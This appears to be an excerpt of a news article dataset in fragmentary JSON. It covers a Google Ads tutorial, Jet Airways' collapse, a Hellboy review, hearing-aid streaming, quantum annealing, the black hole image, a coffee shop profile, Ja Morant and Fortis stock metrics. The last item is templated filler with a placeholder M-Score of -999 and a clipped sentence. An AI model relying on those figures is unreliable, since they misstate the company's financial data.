      "text": "The Display Network is a completely different animal than it\u2019s Search Network counterpart. \nIf you simply copy your Search Network campaign settings over to the Display Network, you\u2019ll likely miss out on a boatload potential clicks and customers. \nFortunately, setting up a Display Network is fairly easy if you know what to do. I\u2019ll teach you how to set up an effective Display Network campaign from scratch, including how to set up your campaigns, ads and keywords for maximum ROI. \nYour first step is to log into Google Ads and click on \u201ccampaigns.\u201d Then click on the \u201cnew campaign\u201d button and click on \u201cdisplay network only.\u201d Then you want to give your campaign a name. So if you are selling tennis rackets, you\u2019d want to call it tennis rackets. \nAnd in general you want your campaigns to be very tightly focused around one product or service that you sell. And then you want to keep the type as \u201cdisplay network only\u201d and keep all features on so then you modify all the features. If you have a search network campaign that you want to copy as a display network campaign, click the drop-down menu and choose the campaign from the list. \nBut otherwise, you generally want to create a display network campaign that\u2019s a bit different, so you can use display network specific strategies. Now if you want to target people on specific devices, like desktops and laptops or mobile devices, you can do so by clicking on \u201cadvanced mobile and tablet options,\u201d and then you include or exclude people that use specific operating systems, devices or internet service providers. And \u201clocation or languages\u201d are simply where you want your ads to be displayed and in what language. \nNow typically, you want to keep this as United States but if you also ship and service to Canada you\u2019d want to include that here. And in addition, if you want to add a country you could add a country, like Germany, if you happen to service the people that live in Germany. \nNow under \u201cbidding and budget\u201d by default AdWords will set the bids to maximize your clicks and that\u2019s typically not what you want because you really want to manually set your bids so you can make sure that you\u2019re spending within your budget and get the most from your money. Now your budget per day you can set that to whatever you like depending on your marketing budget. And if you want to add extensions which are address and phone number information which are added to AdWords ads, you can do that for both the search network and the display network, you can do so by clicking on location and using an address that you already have in a Google Places account or just entering your address. Now once that\u2019s all setup you want to click on \u201csave and continue.\u201d \nNow it\u2019s time to setup your first display network ad group. In general you want your ad groups to be very tightly focused. So if you sold tennis rackets on your site, you\u2019d want one ad group there just for a specific brand of tennis rackets or children\u2019s tennis rackets or high performance tennis rackets. So we\u2019re just going to put \u201cHead tennis rackets\u201d because that\u2019s a popular brand of tennis rackets. And your default bid is how much you want to spend for one click in the display networks. \nWe\u2019re going to set that as a dollar just for now. Now in terms of targeting your ads, in general you want to use display keywords. So this will show your ads on content that\u2019s related to the keywords that you give it. So you\u2019d want to put something like \u201cHead tennis rackets.\u201d So then, when someone is viewing an article about Head tennis rackets, your ads will come up. Now I\u2019m going to show you later how to add more keywords to this but just enter one and click on \u201cadd keywords.\u201d And then when that looks all good, click on \u201csave and continue.\u201d And now it\u2019s time to build your first ad. \nNow for an image ad, this is where you upload an image by clicking \u201cupload an ad\u201d and then uploading an image file. But we\u2019re actually going to create a text ad. And this works the same way as a search network. So you create a headline, one description, a second line description, and the display URL and the actual URL that they go to. And once your ad is built, you\u2019ll see a little preview here and you can either create another ad or click \u201cdone\u201d if you just want to display the ad. That will take you back to the settings for the ad group. If you want to add more ads, click on the ads tab, scroll down, click on \u201cnew ad\u201d and you can choose from the list. \nSo if you want to create another text ad like we did, you click on this. If you want to create a banner, you click on this. And there\u2019s also something known as the \u201cdisplay ad builder.\u201d So if you want to create a display ad from within AdWords without having to upload an image, you can do so by clicking this, choosing one of the templates and then adding the same details that you add to a text ad. So your headline, two description lines, a display URL, and a destination URL. \nNow the big difference between this and a text ad is that, obviously, you can modify it a lot more. So you can modify the color by clicking this. You can modify the animation by clicking this. And you basically make a lot of changes. So once that looks good, click on \u201cpreview and save\u201d and then you can add that to your ad group. \nBut what we\u2019re going to do now is actually look for more keywords to add to our display campaign. So we\u2019re going to click \u201ccancel\u201d and then click on \u201ctools and analysis\u201d and click on \u201cdisplay planner\u201d which is basically the keyword planner for the display network. Next, click on \u201cideas and estimates\u201d and add some keywords related to what you sell. So tennis rackets. Or you can include a landing page URL if you already have a landing page setup that you expect your AdWords traffic to go to. \nThen once that\u2019s all setup, click on \u201cad group ideas,\u201d then click on \u201cindividual targeting ideas.\u201d This will show you information about the keyword that you gave it. So you get an idea of the age groups that you will be targeting and the gender of the people that you will be targeting. And if you see a related keyword that looks like a good fit, you can click on it. And if all this information looks good about impressions, age group and gender, you can click on \u201cadd to ad group\u201d and it will be added to your ad group. \nNext I\u2019m going to show you how to advertise on specific places within the display network. And to do that, click on the \u201cplacements\u201d button. And as you can see there are 301 websites, 76 mobile apps and 52 videos within the AdWords database. Now obviously when you advertise in a display network, your ads are going to appear on a lot more than 301 different websites. But these are just sites that participate in a program where you can check them out before you can advertise on them. So to see these sites, just click on this button. And then you can check out the information on the websites that they have in their database. \nIn this case, you can tennisrackettrader.com. You can actually see the site before you advertise on it. You can check out some of the ad formats that they accept, how relevant it is to the keyword that you entered, the historic cost per click, the cookies per week. So how many visitors they have with cookies, so you can target people with specific interests with demographics and how many impressions per week you can expect for advertising on that site. \nSo if the site looks good, click on the little blue button and it will be added to your ad group. So that\u2019s all there is to advertising on a Google AdWords display network. As you can see there\u2019s some overlap between a display network and the search network, but there are a lot of important nuances to keep in mind to get the most from your display network campaigns.",

      "title": "Etihad Group Faces Another Failure As India's Jet Airways Collapses",
      "text": "India\u2019s Jet Airways is undergoing a spectacular collapse and even last-minute financing might not be enough to get the airline back in the air. \nView Of Airport Ground Stewardess Loading In Passengers Goods Into Jet Airways Passenger Airplane At Loading And Unloading Gate Of Schiphol International Airport In Amsterdam The Netherlands Europe photo credit: Getty \nGetty \nThe growth of low-cost competition, a rise in fuel prices and an unfavorable exchange rate contributed to the $1.2 billion debt that the airline faces today. \nAs aviation industry analyst Thomas Jaeger, CEO of ch-aviation GmbH explains, the crisis at Jet Airways has been allowed to go too far. \n\u201cIt is quite unusual that airlines are allowed to carry on operating for such a long time despite not paying salaries, loans, and dues with public bodies,\u201d he said. \u201cThe Indian market has been very competitive for many years with a much higher than worldwide average market share of low-cost carriers; and the Gulf carriers\u2019 capacity and more competitive hubs in Dubai and Doha, for example, making the competitive landscape a tough one to operate in for a full service carrier like Jet Airways.\u201d \nThrough his flight distribution business, Jetair, Naresh Goyal, founder of Jet Airways, is reportedly working with Future Trend Capital, Delaware and London-based Adi Partners to save the airline. \nEtihad Airways Group, which currently holds 24% of Jet Airways, has hesitated to increase its shares and failed to reach terms for additional financial support. Etihad had wanted Goyal to cede control of the airline, which Goyal agreed to in March of this year. However, the situation has only worsened and Jet Airways is still waiting for a rescue package. \n\u201cThere have been board conflicts between Etihad and Naresh Goyal, with arguments over who runs Jet Airways and makes which decision, which is also similar to what happened at other carriers,\u201d Jaeger says. \nEtihad's influence on these partners, Jaeger says, has not always been positive in part because the objective of the investment has been to strengthen Etihad and its base in Abu Dhabi. \u201c[Etihad] did invest in Jet Airways with the intent of buying feed for its global air hub ambitions in Abu Dhabi, and feeding that hub was not necessarily in Jet\u2019s best interest,\u201d Jaeger says. \nThe Etihad Group has not hesitated to invest in order to quickly tear down barriers to entry in key markets around the world, and it expressly targetted vulnerable carriers to do so. When Etihad agreed to buy its shares of Jet Airways, India\u2019s civil aviation ministry approved a new bilateral agreement with Abu Dhabi which allowed Etihad greater access. \n\u201cJust like other airlines that Etihad has invested in, Jet Airways already was not performing very well prior to Etihad\u2019s investment. It has gone through a series of strategy changes, one of which was to more align its product with low-cost carriers, densifying cabins and shifting a significant part of its domestic flying to a no-frills model; and then a change of heart and switch back to the full-service model,\u201d Jaeger adds. \u201cAll of these changes have certainly not helped Jet\u2019s situation. There is some sort of a parallel between what happened to other carriers Etihad invested in\u2013Air Berlin, Air Serbia, Air Seychelles, Alitalia, Virgin Australia\u2013given all of them have been forced or encouraged to change their network to help to grow the Abu Dhabi hub.\u201d \nRunning to Ground \nJet Airways had a fleet of 120 aircraft and had grounded all but seven of them by last estimate\u2013six turboprops and one Boeing 737. The airline canceled all international flights on Friday as it faced an uncertain future, including the possibility that more of their aircraft might be re-possessed by lessors. One the airline\u2019s Boeing 777-300ERs was reclaimed at Schiphol Airport last Wednesday due to the debt Jet Airways owed to cargo handler World Flight services. \nAs with Alitalia, a solution to Jet Airways' woes may come down to government intervention. The national carrier, Air India, is unable to expand fast enough to cover the gap Jet Airways might leave in the market, but it could do so through a government-backed merger of the two carriers. While merging the two very different organizations and brands might prove problematic, the government could simply step-in using the U.S. 'too big to fail' model of airline rescue packages. \n\u201cIt appears to me that the Indian government has a key interest in keeping ailing airlines alive for as long as possible which could also be seen in earlier circumstances, i.e. with Kingfisher Airlines,\u201d Jaeger said. \nJet Airways competes against state-funded Air India which also faces its own financial challenges. But despite problems with administration and heavy competition, there is a vast and growing market for all carriers serving India to satisfy. \nIATA predicts that India will be the world\u2019s third largest air travel market by 2036, following China and the U.S. and leaving the rest of the world far behind. \nIATA 2036 Major Domestic Market Projections \nIATA \nA critical gap in Asian connectivity has already become apparent as a result of the Jet Airways crisis. Demand for travel between India and Hong Kong , for example, is so high that passengers and airlines are now up against a capacity crisis that has sent airfares soaring. \nWhile nothing is decided, the airline may simply fall into a permanent grounding. Competitors will have to find a way to close the gap. Tata Group\u2019s Vistara, which itself has ambitions to grow its international routes, has not bid for a stake in Jet Airways. Instead, it appears to be waiting for Jet Airways to crumble so it can buy up the pieces.",

      "title": "'Hellboy': Hell, No",
      "text": "Hellboy, despite its colon-free title, is actually the fifth movie starring the good-guy demon hero (if you count the two animated films that featured the same cast as the live-action films made by monsteur auteur Guillermo del Toro in 2004 and 2008) and it's even more exhausting than this sentence. \nPity. The blue-collar, crimson-skinned agent of the Bureau for Paranormal Research and Defense \u2014 basically a more inclusive version of the Men in Black, with a more casual dress code \u2014 is a marvelous character on the page. And because filmmaker del Toro has at least as much affection for 1930s serials and monster movies and European folklore as cartoonist Mike Mignola (Hellboy's creator) does, his two adaptations of Mignola's comics were revered. But like most del Toro films they were only moderate box office successes, and the profligate profitability of Marvel movies in the subsequent decade (Hellboy is a creator-owned specimen of IP, outside the Disney megalith) demanded that someone try to tap that rich vein again. \nEnglishman Neil Marshall would appear to be a sterling candidate: He made a trio of well-regarded low-budget genre flicks and directed two episodes of Game of Thrones, including \"Blackwater,\" which featured the climactic battle of the series' second season . The chaotic, repetitive movie he's given us here calls into question not just his competence but his taste. He's de-emphasized the warmth del Toro brought to the material and amped up the limb-rending and especially the eye-piercing a hundredfold. This is clearly a calculated decision; with the majority of comic book films sticking to PG-13 levels of genocide, all this gristle and viscera has at least a chance of making Hellboy '19 feel distinct. But the gore is deployed too indiscriminately to provoke anything other than bored revulsion, offering neither a sense of threat nor comic punctuation, the way it does in, say, the Evil Dead movies. \nThe flying entrails aren't the only element that feels hacky. Marshall scores most of his big set pieces with soundalike selections of ersatz blooze-rock. (The last one uses M\u00f6tley Cr\u00fce's 1989 jock jam \"Kickstart My Heart,\" saving the best for last, I guess.) He has apparently directed star David Harbour \u2014 replacing Ron Perlman as the demon with the red and extremely rocky right hand \u2014 to elongate his line readings like Point Break -era Keanu Reeves whenever he wishes to convey irritation, which is most of the time. Maybe the actor is just trying to be heard under all that monster makeup. Harbour, a pleasingly idiosyncratic performer on Stranger Things and in the Bond flick Quantum of Solace, does not possess Perlman's long-honed talent for conveying complex emotion through latex. \nThe rest of the cast is fine. Its biggest get is Ian McShane, doomed for all eternity to lend his profane tenor to stuff that is not as good as Deadwood, who plays Trevor Bruttenholm, the cranky paranormal scholar who found baby demon Hellboy in 1944 and raised him as his own son. (There's a line of dialogue about some kind of spell that makes both characters age slowly.) Milla Jovovich plays a witch who was dismembered and buried in several different coffins by King Arthur, only to rise again in the 21st century to bring about Armageddon by... copulating with Hellboy, I think. If Jovovich was ever on set as the same time as the other actors, it doesn't feel that way. Daniel Dae Kim replaced Ed Skrein as special forces soldier and undead were-jaguar Ben Daimo\u2014 a character of Japanese-American extraction \u2014 during pre-production, after complaints of whitewashing. Texan Sasha Lane plays BPRD agent Alice Monaghan, whom Hellboy rescued from abduction by malevolent fairies when she was just a baby. There's an attempt to give the later two an esprit de corps with Hellboy, but the movie never pauses long enough between monster battles for any of its character work to stick. We have to hurry up and get to the destruction of London, and then the undestruction of London. It all feels weightless and reversible, which makes it feel endless. \nSome of Mignola's most memorable Hellboy stories have been short ones \u2014 like \"The Corpse,\" which presented the rescue of little Alice depicted in flashback in the new movie \u2014 so it's fitting, I guess, that this movie features exactly two terrific sequences that could be carved out and presented as shorts. In one of them, Hellboy consults Baba Yaga, a rotting, crab-like witch who lives in a house mounted on giant Ostrich legs. Her domicile is the most arresting image in the movie, but Baba Yaga's tactile appearance and otherworldly way of scurrying about the frame lingered with me, too. And Hellboy's re-introduction, wherein he must recover a fugitive BPRD agent from a Tijuana sports venue where his target is participating in a lucha libre match, plays like a cold open from a Bond flick \u2014 a witty, self-aware sequence that sets a tempo the film's remaining 105 minutes can't meet. \nMuch of the appeal of Mignola's comics lies is in his angular, heavy-ink style, which in addition to conjuring mood and atmosphere, makes the gnarly stuff less gross to look at. (Other artists who've drawn the character, like Duncan Fegredo, have followed Mignola's example.) Rendering all this stuff in photorealistic CGI does not necessarily add value. If we have to have more Hellboy movies and del Toro isn't going to make them, maybe they should be shot in black and white. \nCopyright 2019 NPR. To see more, visit https://www.npr.org.",

      "text": "Every wonder how clean your local restaurants are? City of Alexandria restaurants regularly undergo health inspections, with the frequency depending on the type of food served and how it is prepared. While violations like malfunctioning refrigerators and food that's not warm or cold enough often pop up, health inspectors sometimes note more critical violations. \n\"In our experience, it is unrealistic to expect that a complex, full-service food operation can routinely avoid any violations,\" notes the Virginia Department of Health. \nHere are full results for Del Ray and Old Town Alexandria area restaurants, which includes restaurants that passed with no violations.

      "title": "Android users now able to stream audio content via connected hearing devices",
      "text": "With a focus on hearing accessibility, Google has teamed up with Cochlear and GN Hearing to launch a new service that uses Bluetooth Low Energy to stream content from Android devices directly to hearing aids. \nCustomers will be able to use their hearing aids to tap into the audio from their Android device. The technology was developed with a particular emphasis on preserving battery life for the hearing aids. \nThe announcement comes with the rollout of Android 10, and will first be available on the Google Pixel 3, Pixel 3 XL and Pixel 3a XL. Customers can use ReSound LinX Quattro and Beltone Amaze hearing aids as well as the Cochlear Nucleas7 Sound Processor. \u200b \n\u201cThe streaming capability with the latest hearing devices from Cochlear or GN Hearing expands accessibility to more consumer technology. The benefit to our users is they will no longer have to use an intermediate device to stream audio from a compatible Android device to their cochlear implant sound processor or hearing aid,\u201d Jan Janssen, CTO of Cochlear, said in a statement. \nWHY IT MATTERS \nHearing loss is a fairly common condition in the US. While it can impact patients at any age, it is most common in older adults. About 28 million people in the US could benefit from hearing aids, according to the NIH . \nDr. Charlotte Yeh, chief medical officer at AARP , named hearing loss as one of the top health issues that technology could address. \n\u201cTechnology for hearing devices has improved a lot but it still remains inaccessible to the vast majority of [older] adults for two reasons,\u201d Yeah said to MobiHealthnews. \u201cOne is the cost. The current model for hearing aides is thousands of dollars per hearing aid per year. It is not covered by Medicare because Medicare calls hearing loss a normal part of aging, so why should we fix it?\u201d \nTHE LARGER TREND \nThis isn\u2019t Google\u2019s first go-round with the hearing space. In February the tech giant launched two new apps focused on hearing accesibility. The first is focused on quickly translating everyday speech into text, and the second focuses on amplifying sounds for the user. Further, it's been just over a year since Google and GN Hearing announced the audio streaming capability for a smaller subset of devices. \nApple has also been interested in this space. In June it announced a new feature that will alert users if environmental noise or phone audio could impact long-term hearing health. That same month the company also updated its iPhone and hearing aids information page with details on how hearing aids can work with iPhone, iPad or iPod touch. The devices can pair with the user\u2019s hearing aids and be controlled through the device. The Apple device lets users view battery life, adjust volume for hearing aids and turn on music.",

      "title": "New algorithm optimizes quantum computing problem-solving",
      "text": "Tohoku University researchers have developed an algorithm that enhances the ability of a Canadian-designed quantum computer to more efficiently find the best solution for complicated problems, according to a study published in the journal Scientific Reports . \nQuantum computing takes advantage of the ability of subatomic particles to exist in more than one state at the same time. It is expected to take modern-day computing to the next level by enabling the processing of more information in less time. \nThe D-Wave quantum annealer, developed by a Canadian company that claims it sells the world's first commercially available quantum computers, employs the concepts of quantum physics to solve 'combinatorial optimization problems .' A typical example of this sort of problem asks the question: \"Given a list of cities and the distances between each pair of cities, what is the shortest possible route that visits each city and returns to the original city?\" Businesses and industries face a large range of similarly complex problems in which they want to find the optimal solution among many possible ones using the least amount of resources. \nPh. D candidate Shuntaro Okada and information scientist Masayuki Ohzeki of Japan's Tohoku University collaborated with global automotive components manufacturer Denso Corporation and other colleagues to develop an algorithm that improves the D-Wave quantum annealer's ability to solve combinatorial optimization problems. \nThe algorithm works by partitioning an originally large problem into a group of subproblems. The D-Wave annealer then iteratively optimizes each subproblem to eventually solve the original larger one. The Tohoku University algorithm improves on another algorithm using the same concept by allowing the use of larger subproblems, ultimately leading to the arrival at more optimal solutions more efficiently. \n\"The proposed algorithm is also applicable to the future version of the D-Wave quantum annealer, which contains many more qubits,\" says Ohzeki. Qubits, or quantum bits, form the basic unit in quantum computing . \"As the number of qubits mounted in the D-Wave quantum annealer increases, we will be able to obtain even better solutions,\" he says. \nThe team next aims to assess the utility of their algorithm for various optimization problems. \nMore information: \nShuntaro Okada et al. Improving solutions by embedding larger subproblems in a D-Wave quantum annealer, \nScientific Reports \n(2019). \nDOI: 10.1038/s41598-018-38388-4 \nCitation : New algorithm optimizes quantum computing problem-solving (2019, April 10) retrieved 10 April 2019 from https://phys.org/news/2019-04-algorithm-optimizes-quantum-problem-solving.html \nThis document is subject to copyright.

      "text": "Pilots at British Airways have overwhelmingly voted to settle their long-running dispute over pay and conditions with the airline. \nThe vote confirms the end of one of the most damaging industrial disputes in BA\u2019s history, which included two days of strikes in September and the cancellation of 2,325 flights. It cost the carrier \u00a3121m. \nIn a ballot that closed on Monday, BA staff in the British Airline Pilots\u2019 Association voted by almost 9 to 1 to accept a deal proposed by the Acas conciliation service in November. \nPilots voted by more than 90% to take industrial action in the original ballot. The strikes in September were the first by pilots in the airline\u2019s history. \nA third day of strikes was called off, and with pilots needing to take further action soon after Christmas or lose the mandate for industrial action, Balpa recommended they accept the deal, more than a year after talks started. \nThe final deal is still worth the same 12% over three years, and does not have the profit-sharing scheme pilots demanded, but has some concessions on rosters and working issues. \nA BA spokesman said: \u201cWe welcome this news, which is a good result for our customers, our people and our business.\u201d",

      "title": "Here's how astronomers took the first image of a black hole that's located 55 million light years away",
      "text": "Astronomers have taken the first image of a black hole using the Event Horizon Telescope . \nThe black hole is a supermassive black hole located 55 million light years away in the heart of the Messier 87 galaxy. \nFor years, experts thought it was impossible to see a black hole through a telescope . \nIt took the combined efforts of hundreds of experts and eight telescopes around the world to achieve this feat. \nVisit BusinessInsider.com for more stories. \nFollowing is a transcript of the video. \nWhat you are seeing is the first ever image of a black hole. Maybe it doesn't look spectacular at first. But consider this: Black holes by their very nature are invisible . \nBecause their gravitational pull is so strong that not even light can escape them. So for many years, astronomers thought that an image like this was impossible. How do you take a picture of something that does not emit light? \nWell, it starts with a small team of innovators. And ends with a telescope that's unlike anything the world has ever seen. Now, despite major advances in telescope technology there is no single telescope on Earth that can take a picture of a black hole. \nThey're all too small. So, astronomers innovated. If one telescope couldn't do the job, then perhaps 8 would \u2014 and they were right. They used 8 radio telescopes stationed at different points across the world. And kept them all in synch with powerful atomic clocks. They call the effort the Event Horizon Telescope. \nThis series of telescopes, combined, has about the same capabilities as a telescope as large as our entire planet . And for the first time in history, it has shown us what a black hole around 55 million light years away looks like. This black hole is actually a supermassive black hole. \nIt's about 6.5 billion times as massive as our Sun \u2014 that's enormous even compared to other supermassive black holes a nd lives in the center of the Messier 87 galaxy. And as far as experts can tell, it looks EXACTLY like what Einstein's general theory of relativity predicted. Here's a simulation of what the Event Horizon Team thought the black hole would look like. And here's the real image. \nThe light you see here is what's called the accretion disk . It's a disk of light that forms around the black hole when a star travels too close and is broken apart in the process. But the most important part of this photo is where there is no light. That dark circle in the center, which measures 25 billion miles across. \nThat right there, is proof that black holes look and behave how astronomers thought. More specifically, that they actually have an edge. It's a place of no return, which astronomers call the event horizon. Once you cross the event horizon, the black hole's gravity is so strong that you cannot escape it. Not you, nor the fastest spacecraft, not even the fastest thing in the universe: light. \nThat's why the edge and everything beyond it are black. Trapped inside the black hole's gravitational grip. And this image may be just the beginning. \nThe Event Horizons Telescope team has also turned its sights on another black hole. One that is closer to home, called Sagittarius A*. It's the supermassive black hole at the center of our own galaxy, the Milky Way, about 25,000 light-years away. But it's significantly smaller than the one in Messier 87. \nSo it will probably be more difficult to image. And since it took astronomers two years to combine and analyze data for this first image, it may be a while before we see what other black holes look like. ",

      "text": "Fifteen minutes after sunrise, before the customers come into his coffee shop, Ty Harrell pours himself a Cortado. \nIt\u2019s equal parts double-espresso and steamed milk. For the 33-year-old Harrell, the owner of Equinox Coffee Co., Norfolk\u2019s newest coffee shop, the word \u201cequal\u201d carries a lot of meaning. It\u2019s in the name of his shop \u2014 the astronomical moment when day and night are of equal length \u2014 and in his approach to life. \n\u201cWe are about balance in life \u2014 the seasons, the ingredients,\u201d says the Virginia Beach native and resident, who opened the coffee shop with his wife earlier this year. \u201cWe change the coffee menu according to what is blooming.\u201d \nWalk into Equinox, at the 28th Street and Colley Avenue, and you will be transfixed by the scent of lavender, an herb Harrell is fond of infusing into his pastries and coffee. \nEquinox treats all tastes the same. There\u2019s a Golden Sun Latte for non-coffee drinkers made with turmeric, cinnamon, cardamom and milk. There\u2019s mat\u00e9, a hearty tea from Brazil. And there\u2019s Ecuadorian coffee that Harrell describes as rich and easy-drinking with a hint of wine flavor. \nHe sells only single-origin coffee, sourced from one producer, crop, farm or region, and is passionate about equitability and sustainability. \nInside Equinox, the atmosphere is unique. The refurbished original 1930s tin ceiling and woodwork \u2014 both jobs done by Harrell and his brother \u2014 spotlight the core mission of the place: a fusion of old and new. \nSeed of Life designs \u2014 Equinox\u2019s logo \u2014 are everywhere, and music from Fela Kuti, the Nigerian father of Afrobeat music in \u201960s and \u201970s plays in the background. \nHarrell is himself a drummer and pianist, having worked as a sound engineer and music producer in Northern California in his late 20s. \nHis life\u2019s journey, too, is equal parts risk and comfort. \nHarrell left high school before graduation and earned a GED before leaving Hampton Roads. Already a vegetarian and interested in spiritual traditions and Christian mysticism, he landed a job on an organic vegetable farm in Maryland at the age of 18. \nA year later, he got married, and he and his wife, Christine, moved to Boulder, Colo., to attend the Buddhist-influenced Naropa University. \nThey were 21 years old with two children. \nWhile earning a bachelor\u2019s in International Peace and Conflict Studies from Naropa, it was a chance encounter that opened Harrell up to the world of coffee and his current line of work. \n\u201cOur kids\u2019 preschool teacher was the wife of Justin Hartman, owner of Ozo Coffee,\u201d Harrell says. He worked at the Colorado-based Ozo for several years learning the entire craft of coffee brewing \u2014 from growing to harvesting to roasting. \nWhile Equinox does not presently roast its beans, Harrell plans to do so in the near future. \nAt age 30, Harrell and his wife felt the call to move back to Hampton Roads. \n\u201cWe were living in Equator and saw that four generations of one family would live in one house. We wanted that experience for our kids,\u201d Harrell says. \nTo pay bills and resettle his family, he returned to his work as a carpenter, but the taste to own his own coffee shop never went away. \n\u201cI would drive around the Beach and Norfolk looking for available places,\u201d Harrell says. \u201cWhen I saw this (Equinox\u2019s location) was available, I called the same day the \u2018For Lease\u2019 sign went up in the window.\u201d \nAnd apparently, Harrell knows a thing or two about making good coffee. \nDan Bremnes, visiting from Nashville, Tenn., loved the Cortado Harrell made him. \n\u201cSure, the (Ethiopian) beans are real good, not bitter,\u201d says Bremnes, who considers himself a seasoned veteran of coffee shops around the country. \u201cBut it\u2019s the guy behind the counter that\u2019s making this so good. \n\u201cThe consistency of the grind is excellent. The pressure of the La Marzocco (the machine) is perfect.\u201d \nBremnes and his two friends say they will be back later that day for more. \nThose are words any new coffee shop owner thirsts for.",

      "title": "With NBA future waiting, Ja Morant makes emotional exit from NCAA tournament",
      "text": "HARTFORD, Conn. \u2013 For 48 hours, Ja Morant held the country captivated by his resplendent skill set in the NCAA tournament. He dashed his way into the American sporting mainstream in a manner befitting of his electric first step, as Patrick Mahomes, Luka Doncic and Dwyane Wade all paid their respects on social media. \nThe end for No. 12 Murray State and Morant came swift and cruelly on Saturday night, as No. 4 Florida State blasted the Racers 90-62 . It left the final image of Morant in this NCAA tournament as a searing one, his head buried in a towel on the bench after he exited the blowout loss with 1:35 remaining. The towel hid his tears from going viral. \n\"I was just hurt not being able to take the floor with these guys for the rest of this season, for another game, or possibly two, three, four,\" Morant said. \"But it's been a great season. I really was just thinking back on what all we have accomplished this year.\" \nThe moment captured the pain that accompanied the end of Murray State's remarkable season. The Racers finished 28-5 and lost for the first time since Jan. 31. In near certainty, it also marks the end of Morant's career at Murray State after two seasons as he'll be a high pick in the upcoming NBA draft. \nMorant stressed that he'd yet to make a decision on the NBA. He said he'd talk to his parents when the time came to decide whether to enter the draft. But his teammate, Darnell Cowart, summed up Morant's decision by asking a reporter: \"Would you leave?\" \nMurray State coach Matt McMahon saw Morant crying on the bench and knelt next to him to deliver a message of what he's meant to the school the past two years. \n\"I just thanked him for what he's done, not only for our program, not only what a joy he's been to coach this season and through the whole recruiting process, but thanked him for what he's done for Murray State University,\" McMahon said. \"He's been an incredible ambassador for our school, for our community, and has really shined the light on the great tradition we have at Murray State.\" \nMorant is projected as a top-three pick in the NBA draft and may have positioned himself in the top two after his triple-double in a blowout win over Marquette in the opening round . His legacy at Murray will be that he somehow took a small school in rural Southwestern Kentucky and ushered it into college basketball's mainstream. \nWhile shining a searing spotlight on tiny Murray, Kentucky, Morant never changed. \"His pride and love for the university will be his story,\" said Murray State assistant Casey Long. \nMorant politely declined a question about his timetable for making an NBA decision. \n\"I'm not focused on that right now,\" Morant said. \"I just want to celebrate a wonderful season with my teammates.\" \nMorant hit his first five 3-pointers against Florida State, but ended up shooting just 8 for 21 from the field. He scored 28 points, but Florida State players were thrilled to hold him to just four assists. He'd delivered 16 assists against Marquette, and the Seminoles\u2019 game plan revolved around not sagging off to help on Morant and making sure his teammates didn't beat them. \n\"Our game plan was to take away his options passing,\" said FSU forward Terance Mann, who guarded Morant much of the night. \"Our game plan was to let him score. We knew eventually that's not the way they want to play.\" \nMorant shot just 2 for 9 in the second half, as FSU's length and depth appeared to wear he and the Racers down. He said the emotion when he left the game revolved mostly around this group playing together for the final time. \n\"I was just thinking about what I could have done to help us come out with a win and extend our season,\" he said. \"I think that's what hurt me the most, not being able to take the floor again with this group of guys.\" \nMorant clearly treasured the run, as he took down his locker-room nameplate from the XL Center as a memento. He appreciated being part of an NCAA tournament victory, just the fourth in school history. \n\"I feel like it was an opportunity for us to show the world what we're capable of, coming to the tournament and getting a win,\" Morant said. \"It shows that we have a great program.\" \nMore from Yahoo Sports:",

      "title": "Is Fortis Inc. (TSX:FTS) Undervalued?",
      "text": "The ERP5 Rank is an investment tool that analysts use to discover undervalued companies. The ERP5 looks at the Price to Book ratio, Earnings Yield, ROIC and 5 year average ROIC. The ERP5 of Fortis Inc. (TSX:FTS) is 8595. The lower the ERP5 rank, the more undervalued a company is thought to be. \nInvestors may be doing a portfolio evaluation as we head into the second half of the calendar year. Assessing results from the first half may help identify what went right, and what went wrong. Many investors may have missed the charge, and they keep hoping for stocks to retreat to go on a buying spree. Gaining a solid grasp on the markets may take years to truly figure out. Combining technical analysis and tracking fundamentals may provide a large boost of confidence to the investor. Being able to sift through the countless chatter may take some perseverance and extreme focus. Creating a winning portfolio might only be a few sharp trades away. \nFCF Yield 5yr Avg \nThe FCF Yield 5yr Average is calculated by taking the five year average free cash flow of a company, and dividing it by the current enterprise value. Enterprise Value is calculated by taking the market capitalization plus debt, minority interest and preferred shares, minus total cash and cash equivalents. The average FCF of a company is determined by looking at the cash generated by operations of the company. The Free Cash Flow Yield 5 Year Average of Fortis Inc. (TSX:FTS) is -0.005992. \nTechnicals & Ratios \nThe EBITDA Yield is a great way to determine a company\u2019s profitability. This number is calculated by dividing a company\u2019s earnings before interest, taxes, depreciation and amortization by the company\u2019s enterprise value. Enterprise Value is calculated by taking the market capitalization plus debt, minority interest and preferred shares, minus total cash and cash equivalents. The EBITDA Yield for Fortis Inc. (TSX:FTS) is 0.072652. \nThe Earnings to Price yield of Fortis Inc. (TSX:FTS) is 0.051575. This is calculated by taking the earnings per share and dividing it by the last closing share price.

Value is another helpful tool in determining if a company is undervalued or not. The Q.i. Value is calculated using the following ratios: EBITDA Yield, Earnings Yield, FCF Yield, and Liquidity. The lower the Q.i. value, the more undervalued the company is thought to be. \nQuant Scores \nThe M-Score, conceived by accounting professor Messod Beneish, is a model for detecting whether a company has manipulated their earnings numbers or not. Fortis Inc. (TSX:FTS) has an M-Score of -999.000000. The M-Score is based on 8 different variables: Days\u2019 sales in receivables index, Gross Margin Index, Asset Quality Index, Sales Growth Index, Depreciation Index, Sales, General and Administrative expenses Index, Leverage Index and Total Accruals to Total Assets. A score higher than -1.78 is an indicator that the company might be manipulating their numbers. \nThe Value Composite One (VC1) is a method that investors use to determine a company\u2019s value. The VC1 of Fortis Inc. (TSX:FTS) is 35. A company with a value of 0 is thought to be an undervalued company, while a company with a value of 100 is considered an overvalued company. The VC1 is calculated using the price to book value, price to sales, EBITDA to EV, price to cash flow, and price to earnings. Similarly, the Value Composite Two (VC2) is calculated with the same ratios, but adds the Shareholder Yield. The Value Composite Two of Fortis Inc. (TSX:FTS) is 32. \nInvestors may be interested in viewing the Gross Margin score on shares of Fortis Inc. (TSX:FTS). The name currently has a score of 20.00000. This score is derived from the Gross Margin (Marx) stability and growth over the previous eight years. The Gross Margin score lands on a scale from 1 to 100 where a score of 1 would be considered positive, and a score of 100 would be seen as negative. \nAt the time of writing, Fortis Inc. (TSX:FTS) has a Piotroski F-Score of 7. The F-Score may help discover companies with strengthening balance sheets. The score may also be used to spot the weak performers. Joseph Piotroski developed the F-Score which employs nine different variables based on the company financial statement. A single point is assigned to each test that a stock passes. Typically, a stock scoring an 8 or 9 would be seen as strong. On the other end, a stock with a score from 0-2 would be viewed as weak. \nOne of the most famous sayings in the stock market is \u201cbuy low, sell high\u201d. This may seem like an oversimplified statement, but there are many novice investors who often do the complete opposite. Many investors may be looking too 